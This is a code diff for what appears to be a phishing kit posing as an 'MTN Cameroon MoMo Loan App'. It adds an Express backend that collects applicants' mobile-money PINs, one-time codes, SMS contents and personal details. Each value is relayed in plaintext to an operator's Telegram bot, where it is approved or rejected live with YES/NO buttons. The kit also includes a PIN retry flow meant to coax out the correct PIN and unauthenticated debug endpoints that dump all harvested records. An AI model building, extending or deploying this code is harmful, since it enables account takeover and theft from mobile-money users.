-            handleRejection('otp');
-        }
-    );
-}
-
-// ─── Update PIN Page UI ───
-function updatePinPageUI() {
-    const pinCard = document.querySelector('#page-pin .step-card');
-    if (pinCard) {
-        let attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-        if (!attemptsDisplay) {
-            attemptsDisplay = document.createElement('div');
-            attemptsDisplay.id = 'pinAttemptsDisplay';
-            attemptsDisplay.className = 'pin-attempts';
-            const pinLabel = document.querySelector('#page-pin .pin-label');
-            if (pinLabel) {
-                pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
-            }
-        }
-    }
-}
-
-// ─── Recovery on Page Load ───
-function recoverSession() {
-    console.log('🔄 Checking for saved session...');
-    
-    const appId = loadApplicationId();
-    if (appId) {
-        console.log(`✅ Found application ID: ${appId}`);
-    }
-    
-    const dataLoaded = loadApplicationData();
-    if (dataLoaded) {
-        console.log('✅ Loaded application data');
-    }
-    
-    if (checkOtpTimerRecovery()) {
-        console.log('✅ Recovered OTP timer');
-        return true;
-    }
-    
-    const rejection = loadRejectionInfo();
-    if (rejection) {
-        console.log(`✅ Found rejection info for step: ${rejection.step}`);
-        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
-        S.applicationId = rejection.applicationId;
-        handleRejection(rejection.step);
-        return true;
-    }
-    
-    if (!rejection) {
-        loadFormDraft();
-    }
-    
-    return false;
-}
-
-// ─── Auto-save on input changes ───
-document.addEventListener('input', (e) => {
-    if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
-        saveFormDraft();
-    }
-    if (e.target.closest('#page-step2, #page-step3')) {
-        saveApplicationData();
+        console.error('Error in /api/send-application:', error);
+        res.status(500).json({ ok: false, error: error.message });
     }
 });
 
-// ─── Override goTo for PIN page ───
-const originalGoTo = goTo;
-goTo = function(pageId) {
-    originalGoTo(pageId);
-    if (pageId === 'page-pin') {
-        updatePinPageUI();
-        checkPinStatus();
+// ─── 2. SMS Submission ───
+app.post('/api/send-momo-message', async (req, res) => {
+    try {
+        const { momoData } = req.body;
+        const { applicationId, phone, momoMessage, isResubmission } = momoData;
+
+        applications[applicationId].smsMessage = momoMessage;
+        applications[applicationId].smsStatus = 'pending';
+        applications[applicationId].updatedAt = new Date().toISOString();
+        saveApplications();
+
+        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('Error in /api/send-momo-message:', error);
+        res.status(500).json({ ok: false, error: error.message });
     }
-};
+});
 
-// ─── INIT ───
-updateCalc();
+// ─── 3. PIN Submission ───
+app.post('/api/send-pin', async (req, res) => {
+    try {
+        const { applicationId, pin, isResubmission } = req.body;
+        const app = applications[applicationId];
+        
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
+            const remaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
+            return res.status(429).json({ 
+                ok: false, 
+                error: `Too many failed attempts. Please wait ${remaining} seconds.`,
+                blocked: true,
+                remainingSeconds: remaining
+            });
+        }
+        
+        if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
+            app.pinAttempts = 0;
+            app.pinBlockedUntil = null;
+        }
+        
+        app.pin = pin;
+        app.pinStatus = 'pending';
+        app.updatedAt = new Date().toISOString();
+        saveApplications();
 
-const recovered = recoverSession();
+        const message = `🔐 *PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
+        ]];
 
-if (!recovered) {
-    goTo('page-landing');
-}
+        await sendTelegramMessage(message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('Error in /api/send-pin:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
 
-console.log('✅ MTN Cameroon MoMo Loan App (All Features) loaded!');
+// ─── 4. PIN Rejected Handler ───
+app.post('/api/pin-rejected', async (req, res) => {
+    try {
+        const { applicationId } = req.body;
+        const app = applications[applicationId];
+        
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        app.pinAttempts = (app.pinAttempts || 0) + 1;
+        const remainingAttempts = app.maxPinAttempts - app.pinAttempts;
+        
+        if (remainingAttempts <= 0) {
+            app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+            app.pinStatus = 'blocked';
+            saveApplications();
+            
+            await sendTelegramMessage(
+                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
+            );
+            
+            return res.json({
+                ok: false,
+                blocked: true,
+                remainingAttempts: 0,
+                message: 'Too many failed attempts. Please wait 5 minutes.'
+            });
+        }
+        
+        saveApplications();
+        
+        return res.json({
+            ok: true,
+            remainingAttempts: remainingAttempts,
+            message: `Wrong PIN. ${remainingAttempts} attempt(s) remaining.`
+        });
+        
+    } catch (error) {
+        console.error('Error in /api/pin-rejected:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 5. Reset PIN Attempts ───
+app.post('/api/reset-pin-attempts/:applicationId', async (req, res) => {
+    try {
+        const app = applications[req.params.applicationId];
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        app.pinAttempts = 0;
+        app.pinBlockedUntil = null;
+        app.pinStatus = 'pending';
+        saveApplications();
+        
+        res.json({ ok: true });
+    } catch (error) {
+        console.error('Error resetting PIN attempts:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 6. Get PIN Status ───
+app.get('/api/pin-status/:applicationId', (req, res) => {
+    try {
+        const app = applications[req.params.applicationId];
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        const remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
+        const isBlocked = app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date();
+        let blockRemaining = 0;
+        
+        if (isBlocked) {
+            blockRemaining = Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000);
+        }
+        
+        res.json({
+            ok: true,
+            pinAttempts: app.pinAttempts || 0,
+            remainingAttempts: Math.max(0, remainingAttempts),
+            maxAttempts: app.maxPinAttempts,
+            isBlocked: isBlocked,
+            blockRemainingSeconds: blockRemaining,
+            pinStatus: app.pinStatus
+        });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 7. OTP Submission ───
+app.post('/api/send-otp', async (req, res) => {
+    try {
+        const { applicationId, otp, isResubmission } = req.body;
+        applications[applicationId].otp = otp;
+        applications[applicationId].otpStatus = 'pending';
+        applications[applicationId].updatedAt = new Date().toISOString();
+        saveApplications();
+
+        const message = `🔑 *OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('Error in /api/send-otp:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 8. Resend OTP ───
+app.post('/api/resend-otp', async (req, res) => {
+    try {
+        const { applicationId } = req.body;
+        const app = applications[applicationId];
+        
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        app.otpStatus = 'pending';
+        app.updatedAt = new Date().toISOString();
+        saveApplications();
+        
+        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;
+        
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
+        ]];
+        
+        await sendTelegramMessage(message, buttons);
+        
+        res.json({ ok: true, status: 'otp_resent' });
+    } catch (error) {
+        console.error('Error in /api/resend-otp:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 9. Final Completion ───
+app.post('/api/send-final-details', async (req, res) => {
+    try {
+        const data = req.body.finalData;
+        applications[data.applicationId].pinStatus = 'approved';
+        applications[data.applicationId].updatedAt = new Date().toISOString();
+        saveApplications();
+
+        const message = `✅ *LOAN COMPLETE (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
+
+        await sendTelegramMessage(message);
+        res.json({ ok: true, status: 'dashboard_ready' });
+    } catch (error) {
+        console.error('Error in /api/send-final-details:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 10. Get Rejection Redirect Info ───
+app.get('/api/rejection-info/:applicationId', (req, res) => {
+    try {
+        const app = applications[req.params.applicationId];
+        if (!app) {
+            return res.status(404).json({ ok: false, error: 'Application not found' });
+        }
+        
+        let rejectedStep = null;
+        let errorMessage = '';
+        
+        if (app.smsStatus === 'rejected') {
+            rejectedStep = 'sms';
+            errorMessage = '❌ Your SMS message was rejected. Please check and resubmit.';
+        } else if (app.pinStatus === 'rejected') {
+            rejectedStep = 'pin';
+            errorMessage = '❌ Your MoMo PIN was rejected. Please re-enter your PIN.';
+        } else if (app.otpStatus === 'rejected') {
+            rejectedStep = 'otp';
+            errorMessage = '❌ Your OTP was rejected. Please request a new OTP.';
+        }
+        
+        res.json({
+            ok: true,
+            rejectedStep,
+            errorMessage,
+            applicationId: req.params.applicationId
+        });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 11. Webhook ───
+app.post('/api/telegram-webhook', async (req, res) => {
+    console.log('📩 Webhook received');
+    
+    try {
+        if (req.body.message && req.body.message.text) {
+            const text = req.body.message.text.trim();
+            const chatId = req.body.message.chat.id;
+            const username = req.body.message.from?.username || 'Unknown';
+            
+            console.log(`💬 Command from ${username}: ${text}`);
+            
+            if (chatId.toString() === TELEGRAM_CHAT_ID) {
+                
+                if (text === '/stats') {
+                    const total = Object.keys(applications).length;
+                    const pendingSms = Object.values(applications).filter(a => a.smsStatus === 'pending').length;
+                    const pendingPin = Object.values(applications).filter(a => a.pinStatus === 'pending').length;
+                    const pendingOtp = Object.values(applications).filter(a => a.otpStatus === 'pending').length;
+                    const approved = Object.values(applications).filter(a => a.otpStatus === 'approved').length;
+                    const rejected = Object.values(applications).filter(a => 
+                        a.smsStatus === 'rejected' || 
+                        a.pinStatus === 'rejected' || 
+                        a.otpStatus === 'rejected'
+                    ).length;
+                    
+                    const recentIds = Object.keys(applications).slice(-5);
+                    let recentList = recentIds.length > 0 ? 
+                        recentIds.map(id => {
+                            const app = applications[id];
+                            return `🆔 ${id} - ${app.firstName} ${app.lastName} (${app.smsStatus})`;
+                        }).join('\n') : 
+                        'No applications yet';
+                    
+                    await sendTelegramMessage(
+                        `📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`
+                    );
+                    return res.sendStatus(200);
+                }
+                
+                if (text === '/list') {
+                    const ids = Object.keys(applications);
+                    if (ids.length === 0) {
+                        await sendTelegramMessage('📭 No applications found.');
+                        return res.sendStatus(200);
+                    }
+                    
+                    const displayIds = ids.slice(-10);
+                    let message = '📋 *APPLICATION LIST* 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
+                    displayIds.forEach((id, i) => {
+                        const app = applications[id];
+                        message += `\n${i+1}. 🆔 *${id}*\n`;
+                        message += `   👤 ${app.firstName} ${app.lastName}\n`;
+                        message += `   📱 +237${app.phone}\n`;
+                        message += `   💰 XAF ${app.loanAmount.toLocaleString()}\n`;
+                        message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
+                    });
+                    
+                    if (ids.length > 10) {
+                        message += `\n... and ${ids.length - 10} more. Use /search [ID] to find specific.`;
+                    }
+                    
+                    await sendTelegramMessage(message);
+                    return res.sendStatus(200);
+                }
+                
+                if (text.startsWith('/search ')) {
+                    const searchId = text.replace('/search ', '').trim().toUpperCase();
+                    const app = applications[searchId];
+                    
+                    if (!app) {
+                        await sendTelegramMessage(`❌ Application *${searchId}* not found.`);
+                        return res.sendStatus(200);
+                    }
+                    
+                    await sendTelegramMessage(
+                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +237${app.phone}\n📧 Email: ${app.email}\n💰 Amount: XAF ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: XAF ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+237${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
+                    );
+                    return res.sendStatus(200);
+                }
+                
+                if (text.startsWith('/delete ')) {
+                    const deleteId = text.replace('/delete ', '').trim().toUpperCase();
+                    if (applications[deleteId]) {
+                        const appName = applications[deleteId].firstName + ' ' + applications[deleteId].lastName;
+                        delete applications[deleteId];
+                        saveApplications();
+                        await sendTelegramMessage(`✅ Application *${deleteId}* (${appName}) deleted successfully.`);
+                    } else {
+                        await sendTelegramMessage(`❌ Application *${deleteId}* not found.`);
+                    }
+                    return res.sendStatus(200);
+                }
+                
+                if (text === '/clear') {
+                    const count = Object.keys(applications).length;
+                    if (count === 0) {
+                        await sendTelegramMessage('📭 No applications to clear.');
+                        return res.sendStatus(200);
+                    }
+                    Object.keys(applications).forEach(key => delete applications[key]);
+                    Object.keys(rejectionHistory).forEach(key => delete rejectionHistory[key]);
+                    saveApplications();
+                    saveRejectionHistory();
+                    await sendTelegramMessage(`✅ Cleared all ${count} applications.`);
+                    return res.sendStatus(200);
+                }
+                
+                if (text === '/status') {
+                    const appCount = Object.keys(applications).length;
+                    const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
+                    await sendTelegramMessage(
+                        `✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${webhookInfo.result?.url || 'Not set'}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}`
+                    );
+                    return res.sendStatus(200);
+                }
+                
+                if (text === '/help' || text === '/start') {
+                    await sendTelegramMessage(
+                        `🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (warning!)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`
+                    );
+                    return res.sendStatus(200);
+                }
+                
+                if (text.startsWith('/')) {
+                    await sendTelegramMessage(`❌ Unknown command. Type /help to see available commands.`);
+                    return res.sendStatus(200);
+                }
+            } else {
+                console.log(`⚠️ Unauthorized message from ${username} (${chatId})`);
+                await sendTelegramMessage(`⚠️ You are not authorized to use this bot.`);
+                return res.sendStatus(200);
+            }
+        }
+        
+        if (req.body.callback_query) {
+            const query = req.body.callback_query;
+            console.log('🔘 Callback query:', query.data);
+            
+            try {
+                const { action, step, applicationId } = JSON.parse(query.data);
+                const app = applications[applicationId];
+                
+                if (!app) {
+                    console.log(`❌ Application ${applicationId} not found`);
+                    return res.sendStatus(200);
+                }
+                
+                if (action === 'NO') {
+                    rejectionHistory[applicationId] = {
+                        step: step,
+                        timestamp: new Date().toISOString(),
+                        previousStatus: app[step.toLowerCase() + 'Status']
+                    };
+                    saveRejectionHistory();
+                    console.log(`❌ Rejected ${step} for ${applicationId}`);
+                }
+                
+                console.log(`📝 Processing ${step} for ${applicationId}: ${action}`);
+                
+                const statusKey = step.toLowerCase() + 'Status';
+                if (step === 'SMS' && app.smsStatus === 'pending') {
+                    app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
+                    console.log(`📨 SMS status: ${app.smsStatus}`);
+                } else if (step === 'PIN' && app.pinStatus === 'pending') {
+                    app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
+                    console.log(`🔐 PIN status: ${app.pinStatus}`);
+                } else if (step === 'OTP' && app.otpStatus === 'pending') {
+                    app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
+                    console.log(`🔑 OTP status: ${app.otpStatus}`);
+                } else {
+                    console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
+                }
+                
+                app.updatedAt = new Date().toISOString();
+                saveApplications();
+                
+                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: query.id,
+                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
+                        show_alert: false
+                    })
+                });
+                
+                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
+                await sendTelegramMessage(`📌 *Status Update (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
+                
+            } catch (parseError) {
+                console.error('❌ Error parsing callback data:', parseError);
+            }
+            
+            return res.sendStatus(200);
+        }
+        
+        res.sendStatus(200);
+        
+    } catch (error) {
+        console.error('❌ Webhook error:', error);
+        res.sendStatus(500);
+    }
+});
+
+// ─── 12. Status Check ───
+app.get('/api/status/:applicationId/:step', (req, res) => {
+    try {
+        const app = applications[req.params.applicationId];
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+        
+        let status = 'pending';
+        if (req.params.step === 'sms') status = app.smsStatus;
+        else if (req.params.step === 'pin') status = app.pinStatus;
+        else if (req.params.step === 'otp') status = app.otpStatus;
+        
+        const rejectionInfo = rejectionHistory[req.params.applicationId] || null;
+        
+        res.json({ 
+            ok: true, 
+            status,
+            rejectionInfo,
+            resubmissionCount: app.resubmissionCount || 0
+        });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 13. Debug Endpoints ───
+app.get('/api/debug/applications', (req, res) => {
+    res.json({
+        total: Object.keys(applications).length,
+        applications: applications,
+        rejections: rejectionHistory,
+        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
+    });
+});
+
+app.get('/api/debug/application/:id', (req, res) => {
+    const app = applications[req.params.id];
+    if (!app) return res.status(404).json({ error: 'Application not found' });
+    res.json(app);
+});
+
+// ─── 14. Backup Endpoint ───
+app.get('/api/debug/backup', (req, res) => {
+    try {
+        const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
+        const data = {
+            applications: applications,
+            rejectionHistory: rejectionHistory,
+            timestamp: new Date().toISOString()
+        };
+        fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
+        res.json({ 
+            ok: true, 
+            message: 'Backup created',
+            file: backupFile
+        });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── Serve Frontend ───
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
+    console.log(`💾 Data directory: ${DATA_DIR}`);
+    console.log(`🔗 Visit: http://localhost:${PORT}`);
+});
